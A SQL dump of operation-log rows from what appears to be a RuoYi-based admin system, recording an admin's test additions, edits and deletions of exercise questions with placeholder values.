INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (301, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:04:01\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":69,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":69}', 0, NULL, '2023-10-30 19:04:01', 34);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (302, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:06:56\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":70,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":70}', 0, NULL, '2023-10-30 19:06:56', 31);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (303, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:09:39\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":71,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":71}', 0, NULL, '2023-10-30 19:09:39', 25);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (304, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:09:44\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":-1,\"id\":72,\"params\":{},\"parentId\":71,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":72}', 0, NULL, '2023-10-30 19:09:44', 14);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (305, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:13:32\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":73,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":73}', 0, NULL, '2023-10-30 19:13:32', 28);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (306, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"exerciseProgram\":\"<p>asdasd</p>\",\"id\":73,\"params\":{},\"quesType\":2,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 19:13:36\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 19:13:36', 12);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (307, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:13:44\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":-1,\"id\":74,\"params\":{},\"parentId\":73,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":74}', 0, NULL, '2023-10-30 19:13:44', 13);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (308, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:14:44\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":-1,\"id\":75,\"params\":{},\"parentId\":74,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":75}', 0, NULL, '2023-10-30 19:14:44', 27);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (309, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:15:21\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":76,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":76}', 0, NULL, '2023-10-30 19:15:21', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (310, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:15:26\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":-1,\"id\":77,\"params\":{},\"parentId\":76,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":77}', 0, NULL, '2023-10-30 19:15:26', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (311, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:15:46\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":78,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":78}', 0, NULL, '2023-10-30 19:15:46', 14);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (312, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:15:49\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":-1,\"id\":79,\"params\":{},\"parentId\":78,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":79}', 0, NULL, '2023-10-30 19:15:49', 18);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (313, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:17:19\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":80,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":80}', 0, NULL, '2023-10-30 19:17:19', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (314, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:17:25\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":-1,\"id\":81,\"params\":{},\"parentId\":80,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":81}', 0, NULL, '2023-10-30 19:17:25', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (315, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:18:13\",\"exerciseProgram\":\"<p>qweqweqw</p>\",\"id\":82,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":82}', 0, NULL, '2023-10-30 19:18:13', 19);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (316, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"qwe\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:18:17\",\"exerciseTitle\":\"<p>qweqweeq</p>\",\"exerciseType\":-1,\"id\":83,\"params\":{},\"parentId\":82,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":83}', 0, NULL, '2023-10-30 19:18:17', 30);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (317, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:22:11\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":84,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":84}', 0, NULL, '2023-10-30 19:22:11', 34);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (318, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:22:19\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":-1,\"id\":85,\"params\":{},\"parentId\":84,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":85}', 0, NULL, '2023-10-30 19:22:19', 16);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (319, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:22:58\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":0,\"id\":86,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":86}', 0, NULL, '2023-10-30 19:22:58', 33);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (320, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:47:23\",\"exerciseProgram\":\"\",\"id\":87,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":87}', 0, NULL, '2023-10-30 19:47:23', 34);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (321, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 19:49:39\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":88,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":88}', 0, NULL, '2023-10-30 19:49:39', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (322, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"exerciseProgram\":\"<p>asdasdasd</p>\",\"id\":88,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 19:50:20\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 19:50:20', 22);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (323, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:18:18\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":89,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":89}', 0, NULL, '2023-10-30 20:18:18', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (324, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:19:25\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":90,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":90}', 0, NULL, '2023-10-30 20:19:25', 26);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (325, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:20:40\",\"exerciseProgram\":\"<p>asd</p>\",\"id\":91,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":91}', 0, NULL, '2023-10-30 20:20:40', 38);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (326, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"exerciseProgram\":\"<p>asd123</p>\",\"id\":5,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 20:22:05\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 20:22:05', 26);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (327, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"exerciseProgram\":\"<p>asd123</p>\",\"id\":5,\"params\":{},\"quesType\":2,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 20:22:47\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 20:22:47', 28);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (328, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:31:20\",\"exerciseTitle\":\"<p>asda</p>\",\"exerciseType\":-1,\"id\":92,\"params\":{},\"parentId\":5,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":92}', 0, NULL, '2023-10-30 20:31:20', 61);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (329, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:31:56\",\"exerciseTitle\":\"<p>asdas</p>\",\"exerciseType\":-1,\"id\":93,\"params\":{},\"parentId\":92,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":93}', 0, NULL, '2023-10-30 20:31:56', 22);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (330, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:37:41\",\"exerciseProgram\":\"<p>asdad</p>\",\"id\":94,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":94}', 0, NULL, '2023-10-30 20:37:41', 27);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (331, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"C\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:58:00\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":0,\"id\":95,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":95}', 0, NULL, '2023-10-30 20:58:00', 40);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (332, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:58:21\",\"exerciseProgram\":\"<p>asd11111</p>\",\"exerciseType\":-1,\"id\":96,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":96}', 0, NULL, '2023-10-30 20:58:21', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (333, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"aa\",\"choiceD\":\"a\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:58:37\",\"exerciseTitle\":\"<p>gggggg</p>\",\"exerciseType\":0,\"id\":97,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":97}', 0, NULL, '2023-10-30 20:58:37', 17);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (334, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-30 21:03:49\",\"exerciseProgram\":\"\",\"exerciseType\":-1,\"id\":98,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":98}', 0, NULL, '2023-10-30 21:03:49', 61);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (335, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/8', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 08:56:10', 36);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (336, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/99', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 10:22:28', 34);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (337, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/99', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 10:23:34', 19);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (338, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/99', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 10:27:15', 20);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (339, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"params\":{},\"parentId\":5,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 14:05:59\"}', '{\"msg\":\"操作失败\",\"code\":500}', 0, NULL, '2023-10-31 14:05:59', 29);
